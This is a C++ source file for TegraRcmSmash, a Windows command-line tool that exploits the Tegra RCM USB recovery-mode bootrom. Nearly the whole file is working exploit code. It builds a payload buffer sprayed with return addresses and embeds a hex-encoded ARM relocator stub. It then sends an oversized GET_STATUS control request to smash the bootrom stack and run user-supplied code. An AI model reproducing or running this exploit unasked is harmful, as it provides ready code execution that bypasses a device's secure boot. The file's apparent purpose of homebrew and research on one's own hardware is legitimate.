#include "Types.h"
#include "ScopeGuard.h"
#include "WinHandle.h"
#include <assert.h>
#include <tchar.h>
#include <stdio.h>
#include <io.h>
#include <fcntl.h>
#include <iostream>
#include <fstream>
#include "libusbk_int.h"

class RCMDeviceHacker
{
public:
	RCMDeviceHacker(KUSB_DRIVER_API& usbDriver_, KUSB_HANDLE usbHandle_) : usbHandle(usbHandle_), usbDriver(&usbDriver_), totalWritten(0), currentBuffer(0) {}
	~RCMDeviceHacker() 
	{
		if (usbHandle != nullptr)
		{
			usbDriver->Free(usbHandle);
			usbHandle = nullptr;
		}
	}

	static constexpr u32 PACKET_SIZE = 0x1000;

	int getDriverVersion(libusbk::version_t& outVersion)
	{
		HANDLE masterHandle = INVALID_HANDLE_VALUE;
		if (!libusbk_getInternals(usbHandle, &masterHandle) || masterHandle == nullptr || masterHandle == INVALID_HANDLE_VALUE)
			return -int(ERROR_INVALID_HANDLE);

		libusbk::libusb_request myRequest;
		memset(&myRequest, 0, sizeof(myRequest));

		const auto retVal = BlockingIoctl(masterHandle, libusbk::LIBUSB_IOCTL_GET_VERSION, &myRequest, sizeof(myRequest), &myRequest, sizeof(myRequest));
		if (retVal > 0)
			outVersion = myRequest.version;

		return retVal;
	}
	int read(u8* outBuf, size_t outBufSize)
	{
		UINT lengthTransferred = 0;
		const auto retVal = usbDriver->ReadPipe(usbHandle, 0x81, outBuf, (UINT)outBufSize, &lengthTransferred, nullptr);
		if (retVal == FALSE)
			return -int(GetLastError());
		else
			return int(lengthTransferred);
	}
	int write(const u8* data, size_t dataLen)
	{
		int bytesRemaining = (int)dataLen;
		size_t bytesWritten = 0;
		while (bytesRemaining > 0)
		{
			const size_t bytesToWrite = (bytesRemaining < PACKET_SIZE) ? bytesRemaining : PACKET_SIZE;
			const auto retVal = writeSingleBuffer(&data[bytesWritten], bytesToWrite);
			if (retVal < 0)
				return retVal;
			else if (retVal < (int)bytesToWrite)
				return int(bytesWritten)+retVal;

			bytesWritten += retVal;
			bytesRemaining -= retVal;
		}

		return (int)bytesWritten;
	}
	int readDeviceId(u8* deviceIdBuf, size_t idBufSize)
	{
		if (idBufSize < 0x10)
			return -int(ERROR_INSUFFICIENT_BUFFER);

		return read(deviceIdBuf, 0x10);
	}
	int switchToHighBuffer()
	{
		if (currentBuffer == 0)
		{
			u8 tempZeroDatas[PACKET_SIZE];
			memset(tempZeroDatas, 0, sizeof(tempZeroDatas));

			const auto writeRes = write(tempZeroDatas, sizeof(tempZeroDatas));
			if (writeRes < 0)
				return writeRes;

			assert(currentBuffer != 0);
			return writeRes;
		}
		else
			return 0;
	}
	int smashTheStack(int length=-1)
	{
		constexpr u32 STACK_END = 0x40010000;

		if (length < 0)
			length = STACK_END - getCurrentBufferAddress();
		
		if (length < 1)
			return 0;

		HANDLE masterHandle = INVALID_HANDLE_VALUE;
		if (!libusbk_getInternals(usbHandle, &masterHandle) || masterHandle == nullptr || masterHandle == INVALID_HANDLE_VALUE)
			return -int(ERROR_INVALID_HANDLE);

		libusbk::libusb_request rawRequest;
		memset(&rawRequest, 0, sizeof(rawRequest));
		rawRequest.timeout = 2000; //ms
		rawRequest.status.index = 0;
		rawRequest.status.recipient = 0x02; //RECIPIENT_ENDPOINT

		ByteVector threshBuf(length, 0);
		const auto retVal = BlockingIoctl(masterHandle, libusbk::LIBUSB_IOCTL_GET_STATUS, &rawRequest, sizeof(rawRequest), &threshBuf[0], threshBuf.size());
		if (retVal < 0)
		{
			const auto theError = -retVal;
			if (theError == ERROR_SEM_TIMEOUT) //timed out, which means it probably smashed
				return (int)threshBuf.size();

			return theError;
		}
		else
			return retVal;
	}
protected:
	u32 getCurrentBufferAddress() const 
	{
		return (currentBuffer == 0) ? 0x40005000u : 0x40009000u;
	}
	u32 toggleBuffer()
	{
		const auto prevBuffer = currentBuffer;
		currentBuffer = (currentBuffer == 0) ? 1u : 0u;
		return prevBuffer;
	}	
	int writeSingleBuffer(const u8* data, size_t dataLen)
	{
		toggleBuffer();

		UINT lengthTransferred = 0;
		const auto retVal = usbDriver->WritePipe(usbHandle, 0x01, (u8*)data, (UINT)dataLen, &lengthTransferred, nullptr);
		if (retVal == FALSE)
			return -int(GetLastError());
		else
			return (int)lengthTransferred;
	}

	static int BlockingIoctl(HANDLE driverHandle, DWORD ioctlCode, const void* inputBytes, size_t numInputBytes, void* outputBytes, size_t numOutputBytes)
	{
		WinHandle theEvent = CreateEvent(nullptr, TRUE, FALSE, nullptr);
		if (theEvent.get() == nullptr || theEvent.get() == INVALID_HANDLE_VALUE)
			return false;

		OVERLAPPED overlapped;
		memset(&overlapped, 0, sizeof(overlapped));
		if (DeviceIoControl(driverHandle, ioctlCode, (LPVOID)inputBytes, (DWORD)numInputBytes, (LPVOID)outputBytes, (DWORD)numOutputBytes, nullptr, &overlapped) == FALSE)
		{
			const auto errCode = GetLastError();
			if (errCode != ERROR_IO_PENDING)
				return -int(errCode);
		}

		DWORD bytesReceived = 0;
		if (GetOverlappedResult(driverHandle, &overlapped, &bytesReceived, TRUE) == FALSE)
		{
			const auto errCode = GetLastError();
			return -int(errCode);
		}

		return (int)bytesReceived;
	}

	KUSB_HANDLE usbHandle;
	KUSB_DRIVER_API* usbDriver;
	size_t totalWritten;
	u32 currentBuffer;
};

static KLST_DEVINFO pluggedInDevice;
static WinHandle gotDeviceEvent;

static u32 deviceVid = 0x0955;
static u32 devicePid = 0x7321;
static void KUSB_API HotPlugEventCallback(KHOT_HANDLE Handle, KLST_DEVINFO_HANDLE DeviceInfo, KLST_SYNC_FLAG NotificationType)
{
	if (NotificationType == KLST_SYNC_FLAG_ADDED && DeviceInfo != nullptr &&
		DeviceInfo->Common.Vid == deviceVid && DeviceInfo->Common.Pid == devicePid)
	{
		memcpy(&pluggedInDevice, DeviceInfo, sizeof(pluggedInDevice));
		SetEvent(gotDeviceEvent.get());
	}
}

static WinHandle finishedUpEvent;
static BOOL WINAPI ConsoleSignalHandler(DWORD signal)
{
	switch (signal)
	{
	case CTRL_CLOSE_EVENT:
	case CTRL_LOGOFF_EVENT:
	case CTRL_SHUTDOWN_EVENT:
	case CTRL_C_EVENT:
		memset(&pluggedInDevice, 0, sizeof(pluggedInDevice));
		SetEvent(gotDeviceEvent.get());
		if (WaitForSingleObject(finishedUpEvent.get(), 1000) == WAIT_OBJECT_0)
			finishedUpEvent = WinHandle();
		else
			_ftprintf(stderr, TEXT("Timed out waiting for cleanup, forcibly closing\n"));
	default:
		break;
	}

	return TRUE;
}

int _tmain(int argc, const TCHAR* argv[])
{
#ifdef UNICODE
	fflush(stdout);
	_setmode(_fileno(stdout), _O_WTEXT); 
	fflush(stderr);
	_setmode(_fileno(stderr), _O_WTEXT); 
#endif

	const TCHAR DEFAULT_MEZZO_FILENAME[] = TEXT("intermezzo.bin");
	const TCHAR* mezzoFilename = DEFAULT_MEZZO_FILENAME;
	const TCHAR* inputFilename = nullptr;

	bool waitForDevice = false;

	auto PrintUsage = []() -> int
	{
		_tprintf(TEXT("Usage: TegraRcmSmash.exe [-V 0x0955] [-P 0x7321] [--relocator=intermezzo.bin] [-w] inputFilename.bin\n"));
		return -1;
	};

	for (int i=1; i<argc; i++)
	{
		const TCHAR* currArg = argv[i];

		const TCHAR RELOCATOR_ARGUMENT[] = TEXT("--relocator");
		const TCHAR VENDOR_ARGUMENT[] = TEXT("-V");
		const TCHAR PRODUCT_ARGUMENT[] = TEXT("-P");
		const TCHAR WAIT_ARGUMENT[] = TEXT("-w");

		if (_tcsnicmp(currArg, RELOCATOR_ARGUMENT, array_countof(RELOCATOR_ARGUMENT)-1) == 0)
		{
			if (currArg[array_countof(RELOCATOR_ARGUMENT)-1] == '=')
				mezzoFilename = &currArg[array_countof(RELOCATOR_ARGUMENT)];
			else if (currArg[array_countof(RELOCATOR_ARGUMENT)-1] == 0)
			{
				if (i==argc-1)
					return PrintUsage();

				mezzoFilename = argv[++i];
			}
			else
				return PrintUsage();
		}
		else if (_tcsnicmp(currArg, VENDOR_ARGUMENT, array_countof(VENDOR_ARGUMENT)-1) == 0 ||
				_tcsnicmp(currArg, PRODUCT_ARGUMENT, array_countof(PRODUCT_ARGUMENT)-1) == 0)
		{
			const TCHAR* numberValueStr = nullptr;
			if (currArg[array_countof(VENDOR_ARGUMENT)-1] == '=')
				numberValueStr = &currArg[array_countof(VENDOR_ARGUMENT)];
			else if (currArg[array_countof(VENDOR_ARGUMENT)-1] == 0)
			{
				if (i==argc-1)
					return PrintUsage();

				numberValueStr = argv[++i];
			}
			else
				return PrintUsage();

			const TCHAR HEXA_PREFIX[] = TEXT("0x");
			if (_tcslen(numberValueStr) >= array_countof(HEXA_PREFIX) &&
				_tcsnicmp(numberValueStr, HEXA_PREFIX, array_countof(HEXA_PREFIX)-1) == 0)
				numberValueStr += array_countof(HEXA_PREFIX)-1;

			if (_tcsnicmp(currArg, VENDOR_ARGUMENT, array_countof(VENDOR_ARGUMENT)-1) == 0)
				deviceVid = _tcstoul(numberValueStr, nullptr, 0x10);
			else if (_tcsnicmp(currArg, PRODUCT_ARGUMENT, array_countof(PRODUCT_ARGUMENT)-1) == 0)
				devicePid = _tcstoul(numberValueStr, nullptr, 0x10);
			else
				return PrintUsage();
		}
		else if (_tcsnicmp(currArg, WAIT_ARGUMENT, array_countof(WAIT_ARGUMENT)) == 0)
		{
			waitForDevice = true;
		}
		else if (currArg[0] == '-') //unknown option
		{
			_ftprintf(stderr, TEXT("Unknown option %Ts\n"), currArg);
			return PrintUsage();
		}
		else //payload filename
		{
			inputFilename = currArg;
		}
	}

	//print program name and version
	{
		TCHAR stringBuf[2048];
		stringBuf[0] = 0;
		const auto numChars = GetModuleFileName(NULL, stringBuf, (DWORD)array_countof(stringBuf)-1);
		stringBuf[numChars] = 0;

		const TCHAR* versionInfoStr = TEXT("[UNKNOWN VERSION]");
		if (GetFileVersionInfo(stringBuf, 0, sizeof(stringBuf), stringBuf))
		{
			VS_FIXEDFILEINFO* fileInfo = nullptr;
			unsigned int infoLen = 0;
			if (VerQueryValue(stringBuf, TEXT("\\"), (LPVOID*)&fileInfo, &infoLen) && fileInfo != nullptr && infoLen > 0)
			{
				const u32 outMajor = HIWORD(fileInfo->dwFileVersionMS);
				const u32 outMinor = LOWORD(fileInfo->dwFileVersionMS);
				const u32 outRev	= HIWORD(fileInfo->dwFileVersionLS);
				const u32 outBld	= LOWORD(fileInfo->dwFileVersionLS);

				_stprintf_s(stringBuf, TEXT("%u.%u.%u.%u"), outMajor, outMinor, outRev, outBld);
				versionInfoStr = stringBuf;
			}
		}

		const TCHAR* bitnessStr = nullptr;
#if !_WIN64
		bitnessStr = TEXT("32bit");
#else
		bitnessStr = TEXT("64bit");
#endif
		_tprintf(TEXT("TegraRcmSmash (%Ts) %Ts by rajkosto\n"), bitnessStr, versionInfoStr);
	}

	//check all arguments
	if (deviceVid == 0 || deviceVid >= 0xFFFF)
	{
		_ftprintf(stderr, TEXT("Invalid USB VID specified\n"));
		return PrintUsage();
	}
	if (devicePid == 0 || devicePid >= 0xFFFF)
	{
		_ftprintf(stderr, TEXT("Invalid USB PID specified\n"));
		return PrintUsage();
	}
	if (mezzoFilename == nullptr || _tcslen(mezzoFilename) == 0)
	{
		_ftprintf(stderr, TEXT("Invalid relocator filename specified\n"));
		return PrintUsage();
	}
	if (inputFilename == nullptr || _tcslen(inputFilename) == 0)
	{
		_ftprintf(stderr, TEXT("Please specify input filename\n"));
		return PrintUsage();
	}

	auto ReadFileToBuf = [](ByteVector& outBuf, const TCHAR* fileType, const TCHAR* inputFilename, bool silent) -> int
	{
		std::ifstream inputFile(inputFilename, std::ios::binary);
		if (!inputFile.is_open())
		{
			if (!silent)
				_ftprintf(stderr, TEXT("Couldn't open %Ts file '%Ts' for reading\n"), fileType, inputFilename);

			return -2;
		}

		inputFile.seekg(0, std::ios::end);
		const auto inputSize = inputFile.tellg();
		inputFile.seekg(0, std::ios::beg);

		outBuf.resize((size_t)inputSize);
		if (outBuf.size() > 0)
		{
			inputFile.read((char*)&outBuf[0], outBuf.size());
			const auto bytesRead = inputFile.gcount();
			if (bytesRead < inputSize)
			{
				_ftprintf(stderr, TEXT("Error reading %Ts file '%Ts' (only %llu out of %llu bytes read)\n"), fileType, inputFilename, (u64)bytesRead, (u64)inputSize);
				return -2;
			}
		}

		return 0;
	};
	
	//intentional ptr comparison, if user supplied their own filename always read it
	auto usingBuiltinMezzo = (mezzoFilename == DEFAULT_MEZZO_FILENAME);

	ByteVector mezzoBuf;
	auto readFileRes = ReadFileToBuf(mezzoBuf, TEXT("relocator"), mezzoFilename, usingBuiltinMezzo);
	if (readFileRes != 0)
	{
		if (usingBuiltinMezzo)
		{
			const byte BUILTIN_INTERMEZZO[] =
			{
				0x44, 0x00, 0x9F, 0xE5, 0x01, 0x11, 0xA0, 0xE3, 0x40, 0x20, 0x9F, 0xE5, 0x00, 0x20, 0x42, 0xE0,
				0x08, 0x00, 0x00, 0xEB, 0x01, 0x01, 0xA0, 0xE3, 0x10, 0xFF, 0x2F, 0xE1, 0x00, 0x00, 0xA0, 0xE1,
				0x2C, 0x00, 0x9F, 0xE5, 0x2C, 0x10, 0x9F, 0xE5, 0x02, 0x28, 0xA0, 0xE3, 0x01, 0x00, 0x00, 0xEB,
				0x20, 0x00, 0x9F, 0xE5, 0x10, 0xFF, 0x2F, 0xE1, 0x04, 0x30, 0x90, 0xE4, 0x04, 0x30, 0x81, 0xE4,
				0x04, 0x20, 0x52, 0xE2, 0xFB, 0xFF, 0xFF, 0x1A, 0x1E, 0xFF, 0x2F, 0xE1, 0x20, 0xF0, 0x01, 0x40,
				0x5C, 0xF0, 0x01, 0x40, 0x00, 0x00, 0x02, 0x40, 0x00, 0x00, 0x01, 0x40
			};

			mezzoBuf.resize(sizeof(BUILTIN_INTERMEZZO));
			memcpy(&mezzoBuf[0], BUILTIN_INTERMEZZO, mezzoBuf.size());
		}
		else
			return readFileRes;
	}
	else
		usingBuiltinMezzo = false;

	ByteVector userFileBuf;
	readFileRes = ReadFileToBuf(userFileBuf, TEXT("payload"), inputFilename, false);
	if (readFileRes != 0)
		return readFileRes;

	KLST_DEVINFO_HANDLE deviceInfo = nullptr;
	
	KLST_HANDLE deviceList = nullptr;
	if (!LstK_Init(&deviceList, KLST_FLAG_NONE))
	{
		const auto errorCode = GetLastError();
		_ftprintf(stderr, TEXT("Got win32 error %u trying to list USB devices\n"), errorCode);
		return -3;
	}
	auto lstKgrd = MakeScopeGuard([&deviceList]()
	{
		if (deviceList != nullptr)
		{
			LstK_Free(deviceList);
			deviceList = nullptr;
		}
	});

	// Get the number of devices contained in the device list.
	UINT deviceCount = 0;
	LstK_Count(deviceList, &deviceCount);
	if (deviceCount == 0 || LstK_FindByVidPid(deviceList, deviceVid, devicePid, &deviceInfo) == FALSE)
	{
		if (!waitForDevice)
		{
			_ftprintf(stderr, TEXT("No TegraRCM devices found and -w option not specified\n"));
			return -3;
		}

		_tprintf(TEXT("Wanted device not connected yet, waiting...\n"));
		lstKgrd.run();

		KHOT_HANDLE hotHandle = nullptr;
		KHOT_PARAMS hotParams;

		memset(&hotParams, 0, sizeof(hotParams));
		hotParams.OnHotPlug = HotPlugEventCallback;
		hotParams.Flags = KHOT_FLAG_NONE;

		memset(&pluggedInDevice, 0, sizeof(pluggedInDevice));
		gotDeviceEvent = CreateEvent(nullptr, TRUE, FALSE, nullptr);
		finishedUpEvent = CreateEvent(nullptr, TRUE, FALSE, nullptr);
		sprintf_s(hotParams.PatternMatch.DeviceID, "*VID_%04X&PID_%04X*", deviceVid, devicePid);
		_tprintf(TEXT("Looking for devices matching the pattern %s\n"), 
			WinString(std::begin(hotParams.PatternMatch.DeviceID), std::end(hotParams.PatternMatch.DeviceID)).c_str());

		// Initializes a new HotK handle.
		if (!HotK_Init(&hotHandle, &hotParams))
		{
			const auto errorCode = GetLastError();
			_ftprintf(stderr,TEXT("Hotplug listener init failed with win32 error %u\n"), errorCode);
			return -4;
		}
		auto hotKgrd = MakeScopeGuard([&hotHandle]()
		{
			if (hotHandle != nullptr)
			{
				HotK_Free(hotHandle);
				hotHandle = nullptr;
			}
		});

		if (SetConsoleCtrlHandler(ConsoleSignalHandler, TRUE))
			WaitForSingleObject(gotDeviceEvent.get(), INFINITE);

		gotDeviceEvent = WinHandle();
		if (pluggedInDevice.Common.Vid == deviceVid && pluggedInDevice.Common.Pid == devicePid && pluggedInDevice.Connected == TRUE) //got the device after waiting
		{
			finishedUpEvent = WinHandle();
			deviceInfo = &pluggedInDevice;
		}
		else
		{
			_tprintf(TEXT("Exiting due to user cancellation\n"));
			SetEvent(finishedUpEvent.get());			
			return -5;
		}
	}

	if (deviceInfo != nullptr)
	{
		if (deviceInfo->DriverID != KUSB_DRVID_LIBUSBK)
		{
			_tprintf(TEXT("The selected device path %hs with VID_%04X&PID_%04x isn't using the libusbK driver\n"), 
				deviceInfo->DevicePath, deviceInfo->Common.Vid, deviceInfo->Common.Pid);
			_tprintf(TEXT("Please run Zadig and install the libusbK (v3.0.7.0) driver for this device\n"));

			_ftprintf(stderr,TEXT("Failed to open USB device handle because of wrong driver installed\n"));
			return -6;
		}

		KUSB_DRIVER_API Usb;
		LibK_LoadDriverAPI(&Usb, deviceInfo->DriverID);

		// Initialize the device
		KUSB_HANDLE handle = nullptr;
		if (!Usb.Init(&handle, deviceInfo))
		{
			const auto errorCode = GetLastError();
			_ftprintf(stderr,TEXT("Failed to open USB device handle with win32 error %u\n"), errorCode);
			return -6;
		}
		else
			_tprintf(TEXT("Opened USB device path %hs\n"), deviceInfo->DevicePath);

		RCMDeviceHacker rcmDev(Usb, handle); handle = nullptr;
		
		libusbk::version_t usbkVersion;
		memset(&usbkVersion, 0, sizeof(usbkVersion));
		const auto versRetVal = rcmDev.getDriverVersion(usbkVersion);
		if (versRetVal <= 0)
		{
			_ftprintf(stderr, TEXT("Failed to get libusbK driver version for device with win32 error %d\n"), -versRetVal);
			return -6;
		}
		else if (usbkVersion.major != 3 || usbkVersion.minor != 0 || usbkVersion.micro != 7)
		{
			_tprintf(TEXT("The opened device isn't using the correct libusbK driver version (expected: %u.%u.%u got: %u.%u.%u)\n"),
							3, 0, 7, usbkVersion.major, usbkVersion.minor, usbkVersion.micro);
			_tprintf(TEXT("Please run Zadig and install the libusbK (v3.0.7.0) driver for this device\n"));

			_ftprintf(stderr, TEXT("Failed to open USB device handle because of wrong driver version installed\n"));
			return -6;
		}

		u8 didBuf[0x10];
		memset(didBuf, 0, sizeof(didBuf));
		const auto didRetVal = rcmDev.readDeviceId(didBuf, sizeof(didBuf));
		if (didRetVal >= int(sizeof(didBuf)))
		{
			_tprintf(TEXT("RCM Device with id %02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X initialized successfully!\n"),
				(u32)didBuf[0],(u32)didBuf[1],(u32)didBuf[2],(u32)didBuf[3],(u32)didBuf[4],(u32)didBuf[5],(u32)didBuf[6],(u32)didBuf[7],
				(u32)didBuf[8],(u32)didBuf[9],(u32)didBuf[10],(u32)didBuf[11],(u32)didBuf[12],(u32)didBuf[13],(u32)didBuf[14],(u32)didBuf[15]);
		}
		else
		{
			if (didRetVal < 0)
				_ftprintf(stderr, TEXT("Reading device id failed with win32 error %d\n"), -didRetVal);
			else
				_ftprintf(stderr, TEXT("Was only able to read %d out of %d bytes of device id\n"), didRetVal, (int)sizeof(didBuf));

			return -7;
		}

		size_t currPayloadOffs = 0;
		ByteVector payloadBuf;

		// Prefix the image with an RCM command, so it winds up loaded into memory at the right location (0x40010000).
		// Use the maximum length accepted by RCM, so we can transmit as much payload as we want; we'll take over before we get to the end.
		{
			const u32 lengthData = 0x30298;
			payloadBuf.resize(payloadBuf.size() + sizeof(lengthData));
			memcpy(&payloadBuf[currPayloadOffs], &lengthData, sizeof(lengthData));
			currPayloadOffs += sizeof(lengthData);
		}
			
		// pad out to 680 so the payload starts at the right address in IRAM
		payloadBuf.resize(680, 0);
		currPayloadOffs = payloadBuf.size();

		constexpr u32 RCM_PAYLOAD_ADDR = 0x40010000;
		constexpr u32 INTERMEZZO_LOCATION = 0x4001F000;
		// Populate from[RCM_PAYLOAD_ADDR, INTERMEZZO_LOCATION) with the payload address.
		// We'll use this data to smash the stack when we execute the vulnerable memcpy.
		{
			constexpr size_t bytesToAdd = (INTERMEZZO_LOCATION-RCM_PAYLOAD_ADDR);
			payloadBuf.resize(payloadBuf.size()+bytesToAdd);
			while (currPayloadOffs < payloadBuf.size())
			{
				const u32 spreadMeAround = INTERMEZZO_LOCATION;
				memcpy(&payloadBuf[currPayloadOffs], &spreadMeAround, sizeof(spreadMeAround));
				currPayloadOffs += sizeof(spreadMeAround);
			}
		}

		// Reload the user-supplied relocator in case it changed
		if (!usingBuiltinMezzo)
		{
			readFileRes = ReadFileToBuf(mezzoBuf, TEXT("relocator"), mezzoFilename, false);
			if (readFileRes != 0)
				return readFileRes;
		}

		// Include the Intermezzo binary in the command stream. This is our first-stage payload, and it's responsible for relocating the final payload to 0x40010000.
		{
			payloadBuf.resize(payloadBuf.size()+mezzoBuf.size());
			if (currPayloadOffs < payloadBuf.size())
			{
				memcpy(&payloadBuf[currPayloadOffs], &mezzoBuf[0], mezzoBuf.size());
				currPayloadOffs += mezzoBuf.size();
			}
			assert(currPayloadOffs == payloadBuf.size());
		}

		constexpr u32 PAYLOAD_LOAD_BLOCK = 0x40020000;
		// Finally, pad until we've reached the position we need to put the payload.
		// This ensures the payload winds up at the location Intermezzo expects.
		{
			const auto position = INTERMEZZO_LOCATION + mezzoBuf.size();
			const auto paddingSize = PAYLOAD_LOAD_BLOCK - position;

			payloadBuf.resize(payloadBuf.size()+paddingSize, 0);
			currPayloadOffs += paddingSize;
			assert(currPayloadOffs == payloadBuf.size());
		}

		// Reload the user-supplied binary in case it changed
		readFileRes = ReadFileToBuf(userFileBuf, TEXT("payload"), inputFilename, false);
		if (readFileRes != 0)
			return readFileRes;

		// Put our user-supplied binary into the payload
		{
			payloadBuf.resize(payloadBuf.size()+userFileBuf.size());
			if (currPayloadOffs < payloadBuf.size())
			{
				memcpy(&payloadBuf[currPayloadOffs], &userFileBuf[0], userFileBuf.size());
				currPayloadOffs += userFileBuf.size();
			}
			assert(currPayloadOffs == payloadBuf.size());
		}

		// Pad the payload to fill a USB request exactly, so we don't send a short
		// packet and break out of the RCM loop.
		payloadBuf.resize(align_up(payloadBuf.size(), RCMDeviceHacker::PACKET_SIZE), 0);

		// Send the constructed payload, which contains the command, the stack smashing values, the Intermezzo relocation stub, and the user payload.
		_tprintf(TEXT("Uploading payload (mezzo size: %u, user size: %u, total size: %u, total padded size: %u)...\n"), 
						(u32)mezzoBuf.size(), (u32)userFileBuf.size(), (u32)currPayloadOffs, (u32)payloadBuf.size());

		const auto writeRes = rcmDev.write(&payloadBuf[0], payloadBuf.size());
		if (writeRes < (int)payloadBuf.size())
		{
			if (writeRes < 0)
				_ftprintf(stderr, TEXT("Win32 error %d happened trying to write payload buffer to RCM\n"), -writeRes);
			else
				_ftprintf(stderr, TEXT("Was only able to upload %d out of %d bytes of payload buffer\n"), writeRes, (int)payloadBuf.size());

			return -8;
		}

		// The RCM backend alternates between two different DMA buffers.Ensure we're about to DMA into the higher one, so we have less to copy during our attack.
		const auto switchRes = rcmDev.switchToHighBuffer();
		if (switchRes != 0)
		{
			if (switchRes < 0)
			{
				_ftprintf(stderr, TEXT("Failed to switch to high buffer, win32 error %d\n"), -switchRes);
				return -9;
			}
			else if (switchRes != RCMDeviceHacker::PACKET_SIZE)
			{
				_ftprintf(stderr, TEXT("Only wrote %d out of %d bytes during high buffer switch\n"), switchRes, (int)RCMDeviceHacker::PACKET_SIZE);
				return -9;
			}

			_tprintf(TEXT("Switched to high buffer\n"));
		}

		_tprintf(TEXT("Smashing the stack!\n"));
		const auto smashRes = rcmDev.smashTheStack();
		if (smashRes < 0)
		{
			_ftprintf(stderr, TEXT("Got win32 error %d tryin to smash\n"), -smashRes);
			return -10;
		}
		else
			_tprintf(TEXT("Smashed the stack with a 0x%04x byte SETUP request!\n"), smashRes);
	}

	return 0;
}